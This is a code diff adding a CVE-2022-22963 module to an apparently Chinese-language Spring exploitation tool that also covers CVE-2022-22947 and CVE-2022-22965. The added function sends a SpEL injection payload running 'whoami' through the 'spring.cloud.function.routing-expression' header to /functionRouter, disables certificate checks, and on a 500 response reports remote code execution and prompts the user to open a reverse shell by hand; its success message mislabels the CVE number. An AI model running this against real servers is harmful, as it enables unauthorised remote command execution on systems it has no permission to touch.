@@ -55,6 +55,34 @@ def CVE_2022_22965(url, proxies):
     except Exception as e:
         print(e)
 
+def CVE_2022_22963(url, proxies):
+    cprint("================开始对目标URL进行CVE-2022-22963漏洞利用================", "green")
+    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
+
+    data = 'test'
+    header = {
+        'spring.cloud.function.routing-expression': payload,
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'User-Agent': random.choice(ua),
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    path = 'functionRouter'
+    url = url + path
+    requests.packages.urllib3.disable_warnings()
+    req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
+    code = req.status_code
+    text = req.text
+    rsp = '"error":"Internal Server Error"'
+
+    if code == 500 and rsp in text:
+        cprint(f'[+] {url} 存在编号为CVE-2022-22965的RCE漏洞，请手动反弹shell', "red")
+        print('\n')
+    else:
+        cprint("[-] CVE-2022-22963漏洞不存在", "yellow")
+        print('\n')
+
 def CVE_2022_22947(url, proxies):
     cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
     headers1 = {
@@ -111,6 +139,7 @@ def vul(url,proxies):
         cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
         sys.exit()
     CVE_2022_22947(url ,proxies)
+    CVE_2022_22963(url ,proxies)
     CVE_2022_22965(url ,proxies)
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
